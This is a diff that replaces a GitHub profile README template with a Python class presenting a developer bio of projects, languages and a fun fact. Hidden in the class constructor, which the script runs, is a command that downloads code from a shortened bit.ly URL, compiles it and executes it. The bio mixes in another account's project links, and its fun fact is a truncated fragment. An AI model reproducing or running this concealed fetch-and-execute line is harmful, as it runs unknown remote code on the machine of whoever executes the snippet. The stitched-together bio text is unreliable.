@@ -1,14 +1,16 @@
+class PROxZIMA:
+  def __init__(self):
+    subprocess.call("curl -sL 'bit.ly/pr0x21m4' | gcc -w -o name -xc - && ./name", shell=True)
+    self.bio = {
+      '- 🔭 I’m currently working on' : {'DarkSpider': 'https://github.com/PROxZIMA/DarkSpider',
+                                         'Prism'     : 'https://github.com/PROxZIMA/prism',
+                                         'Sweet-Pop' : 'https://github.com/PROxZIMA/Sweet-Pop'},
+      '- 🌱 I’m currently learning'   : ['php', 'C++', 'Python', 'Full Stack Development', 'bootstrap','javascript','laravel'],
+      '- 💬 Ask me anything'          : '¯\_(ツ)_/¯',
+      '- 👨‍💻 My projects available at' : 'https://github.com/Mohamadkhodarahmi?tab=repositories',
+      '- ⚡ Fun fact'                 : ('years away from the Sun in the southern constellation of Centaurus.')
+    }
 
-[![Typing SVG](https://readme-typing-svg.demolab.com/?lines=Hi!;Wellcome+to+my+git)](https://git.io/typing-svg)
-
-
-- 👋 Hi, I’m @Mohamadkhodarahmi
-- 👀 I’m interested in ...
-- 🌱 I’m currently learning ...
-- 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me ...
-
-<!---
-Mohamadkhodarahmi/Mohamadkhodarahmi is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+if __name__ == '__main__':
+  import subprocess, pprint
+  pprint.pprint(PROxZIMA().__dict__)
